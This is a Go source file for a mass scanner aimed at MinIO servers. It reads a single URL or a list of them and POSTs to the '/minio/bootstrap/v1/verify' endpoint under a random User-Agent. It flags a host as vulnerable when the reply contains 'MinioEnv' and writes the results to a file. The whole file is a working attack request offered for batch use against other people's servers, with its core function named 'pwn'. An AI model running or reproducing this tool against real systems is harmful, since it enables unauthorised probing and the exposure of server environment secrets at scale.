package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type flagInfo struct {
	Url  string
	File string
}

var wg sync.WaitGroup

func main() {
	//start := time.Now()
	var cmd flagInfo
	Flag(&cmd)
	if cmd.Url != "" {
		fmt.Printf("[*]Start scan url\n")
		urlCheck(cmd.Url)
	} else if cmd.File != "" {
		wg.Add(1)
		fmt.Printf("[*]Start scan url\n")
		go urlsCheck(cmd.File)

	} else {
		fmt.Println("please provide the url (-u) or file path (-f)")
	}
	wg.Wait()
	//t := time.Now().Sub(start)
	//fmt.Printf("[*]Scan complete, consuming: %s\n", t)
}

// rand UA header from https://github.com/boy-hack/goWhatweb/blob/master/fetch/fetch.go
func getRandUa() string {
	UserAgents := []string{"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
		"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
		"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"}
	length := len(UserAgents)
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(length)
	return UserAgents[index]
}

func write2err(errText string) {
	errFile, err := os.OpenFile("err.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	if err != nil {
		log.Fatalln("[-]Open file failed", err)
	}
	_, err = errFile.WriteString(errText)
	if err != nil {
		log.Fatalln("[-]Write Err failed", err)
	}
}

func pwn(url string) string {
	client := http.Client{
		Timeout: 10 * time.Second,
	}
	data := strings.NewReader("{}")

	request, _ := http.NewRequest("POST", url, data)
	request.Header.Add("User-Agent", getRandUa())
	request.Header.Add("Content-Type", "application/json")
	resp, err := client.Do(request)
	if err != nil {
		write2err("[-]err" + err.Error() + "\n")
		fmt.Printf("[-]err" + err.Error() + "\n")
		return ""
	}

	defer resp.Body.Close()
	text, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(text), "MinioEnv") && resp.StatusCode == 200 {
		s := fmt.Sprintf("[+]Target %s is vulnerable\n", url)
		fmt.Print(s)
		return s
	} else {
		s := fmt.Sprintf("[-]Target %s is not vulnerable\n", url)
		fmt.Print(s)
		return s
	}
}

func urlCheck(urlString string) {
	schema1 := strings.Contains(urlString, "http://")
	schema2 := strings.Contains(urlString, "https://")
	if schema1 || schema2 {
		addPayload(urlString)
	} else {
		url1 := "http://" + urlString
		addPayload(url1)
		url2 := "https://" + urlString
		addPayload(url2)
	}
}
func urlsCheck(file string) {
	defer wg.Done()
	//open the targets file
	readFile, err := os.Open(file)
	if err != nil {
		write2err("[-]err" + err.Error() + "\n")
	}
	defer readFile.Close()

	//save to the result.txt
	saveFile, err := os.OpenFile("result.txt", os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0644)
	if err != nil {
		write2err("[-]err" + err.Error() + "\n")
	}
	defer saveFile.Close()

	scanner := bufio.NewScanner(readFile)

	for scanner.Scan() {
		u := scanner.Text()
		if len(u) == 0 {
			continue
		}
		schema1 := strings.Contains(u, "http://")
		schema2 := strings.Contains(u, "https://")
		if schema1 || schema2 {
			_, err2 := saveFile.WriteString(addPayload(u))
			if err2 != nil {
				write2err("[-]err" + err2.Error() + "\n")
			}
		} else {
			url1 := "http://" + u
			_, err2 := saveFile.WriteString(addPayload(url1))
			if err2 != nil {
				write2err("[-]err" + err2.Error() + "\n")
			}

			url2 := "https://" + u
			_, err3 := saveFile.WriteString(addPayload(url2))
			if err3 != nil {
				write2err("[-]err" + err3.Error() + "\n")
			}
		}
	}
}

func addPayload(u string) string {
	parsedURL, _ := url.Parse(u)
	payUrl := parsedURL.Scheme + "://" + parsedURL.Host + "/minio/bootstrap/v1/verify"
	result := pwn(payUrl)
	return result
}

func Flag(cmd *flagInfo) {
	flag.StringVar(&cmd.Url, "u", "", "The url you want to scan, for example: http://127.0.0.1:9000/")
	flag.StringVar(&cmd.File, "f", "", "Batch URL Detection, for example: urls.txt")
	flag.Parse()
}
